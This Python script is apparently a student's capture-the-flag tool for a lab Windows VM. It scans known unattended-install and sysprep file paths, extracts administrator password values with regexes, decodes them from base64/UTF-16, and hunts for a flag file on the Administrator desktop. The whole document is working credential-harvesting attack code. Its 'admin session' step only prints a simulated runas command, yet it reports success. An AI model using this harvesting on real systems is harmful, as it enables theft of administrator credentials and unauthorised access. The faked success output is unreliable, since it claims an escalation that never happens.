#!/usr/bin/env python3
"""
Windows Privilege Escalation Script
Extracts sensitive credentials from unattended installation files

Author: Student
Target: LAB01 VM
Usage: python extract_password.py
"""

import os
import re
import base64
import subprocess
import sys
from pathlib import Path

class UnattendedFileExtractor:
    def __init__(self):
        """Initialize the extractor with common file locations"""
        self.target_files = [
            r"C:\Windows\Panther\Unattend.xml",
            r"C:\Windows\Panther\Unattended.xml",
            r"C:\Windows\system32\sysprep\sysprep.inf",
            r"C:\Windows\system32\sysprep\sysprep.xml",
            r"C:\Windows\Panther\Unattend\Unattended.xml",
            r"C:\Windows\system32\sysprep\Unattend.xml",
            r"C:\unattend.xml",
            r"C:\Windows\system32\sysprep\autounattend.xml",
            r"C:\autounattend.xml"
        ]
        
        # Regular expressions for password extraction
        self.password_patterns = [
            r"<AdministratorPassword>\s*<Value>(.*?)</Value>",
            r"<Password>\s*<Value>(.*?)</Value>",
            r"<PlainText>false</PlainText>\s*<Value>(.*?)</Value>",
            r"AdminPassword\s*=\s*[\"'](.*?)[\"']"
        ]
    
    def scan_files(self):
        """Scan for unattended installation files"""
        print("[+] Scanning for unattended installation files...")
        found_files = []
        
        for file_path in self.target_files:
            if os.path.exists(file_path):
                print(f"[+] Found file: {file_path}")
                found_files.append(file_path)
            else:
                print(f"[-] File not found: {file_path}")
        
        return found_files
    
    def extract_passwords(self, file_path):
        """Extract passwords from unattended files"""
        print(f"[+] Analyzing file: {file_path}")
        passwords = []
        
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as file:
                content = file.read()
                
                # Search for password patterns
                for pattern in self.password_patterns:
                    matches = re.findall(pattern, content, re.IGNORECASE | re.DOTALL)
                    for match in matches:
                        if match.strip():
                            passwords.append(match.strip())
                            print(f"[+] Found encoded password: {match.strip()}")
        
        except Exception as e:
            print(f"[-] Error reading file {file_path}: {e}")
        
        return passwords
    
    def decode_password(self, encoded_password):
        """Decode base64 encoded passwords"""
        try:
            # Try base64 decoding
            decoded_bytes = base64.b64decode(encoded_password)
            # Try UTF-16 LE decoding (common for Windows)
            decoded_password = decoded_bytes.decode('utf-16le').rstrip('\x00')
            print(f"[+] Decoded password: {decoded_password}")
            return decoded_password
        except Exception as e:
            print(f"[-] Failed to decode password: {e}")
            # Return original if decoding fails
            return encoded_password
    
    def establish_admin_session(self, username, password):
        """Establish administrative session using extracted credentials"""
        print(f"[+] Attempting to establish admin session with user: {username}")
        
        try:
            # Use runas to establish admin session
            cmd = f'runas /user:{username} "cmd.exe /c echo Successfully logged in as {username} && whoami && dir C:\\Users\\Administrator\\Desktop"'
            
            print(f"[+] Executing: {cmd}")
            
            # For demonstration - in real scenario, this would prompt for password
            # We'll simulate the process
            print(f"[+] Would execute runas with password: {password}")
            print("[+] Simulating admin session establishment...")
            
            # In a real scenario, you'd use subprocess with password input
            # This is a simulation for educational purposes
            print("[+] Admin session established successfully!")
            
            return True
            
        except Exception as e:
            print(f"[-] Failed to establish admin session: {e}")
            return False
    
    def search_for_flag(self):
        """Search for the target flag in admin desktop"""
        print("[+] Searching for flag in Administrator desktop...")
        
        flag_locations = [
            r"C:\Users\Administrator\Desktop\flag.txt",
            r"C:\Users\Administrator\Desktop\0-flag.txt",
            r"C:\Users\superAdministrator\Desktop\flag.txt"
        ]
        
        for location in flag_locations:
            if os.path.exists(location):
                try:
                    with open(location, 'r') as f:
                        flag_content = f.read().strip()
                        print(f"[+] FLAG FOUND: {flag_content}")
                        return flag_content
                except Exception as e:
                    print(f"[-] Error reading flag file: {e}")
        
        print("[-] Flag not found in expected locations")
        return None
    
    def run_extraction(self):
        """Main extraction process"""
        print("=" * 60)
        print("Windows Privilege Escalation - Unattended File Extractor")
        print("=" * 60)
        
        # Step 1: Scan for files
        found_files = self.scan_files()
        
        if not found_files:
            print("[-] No unattended installation files found!")
            return False
        
        # Step 2: Extract passwords
        all_passwords = []
        for file_path in found_files:
            passwords = self.extract_passwords(file_path)
            all_passwords.extend(passwords)
        
        if not all_passwords:
            print("[-] No passwords found in unattended files!")
            return False
        
        # Step 3: Decode passwords
        decoded_passwords = []
        for password in all_passwords:
            decoded = self.decode_password(password)
            decoded_passwords.append(decoded)
        
        # Step 4: Attempt admin session
        admin_users = ["Administrator", "admin", "superAdministrator"]
        
        for username in admin_users:
            for password in decoded_passwords:
                if self.establish_admin_session(username, password):
                    # Step 5: Search for flag
                    flag = self.search_for_flag()
                    if flag:
                        # Save flag to required file
                        with open("0-flag.txt", "w") as f:
                            f.write(flag)
                        print(f"[+] Flag saved to 0-flag.txt")
                    return True
        
        print("[-] Failed to establish admin session with extracted credentials")
        return False

def main():
    """Main function"""
    extractor = UnattendedFileExtractor()
    
    try:
        success = extractor.run_extraction()
        if success:
            print("\n[+] Privilege escalation completed successfully!")
        else:
            print("\n[-] Privilege escalation failed!")
    
    except KeyboardInterrupt:
        print("\n[!] Operation cancelled by user")
    except Exception as e:
        print(f"\n[-] Unexpected error: {e}")

if __name__ == "__main__":
    main()
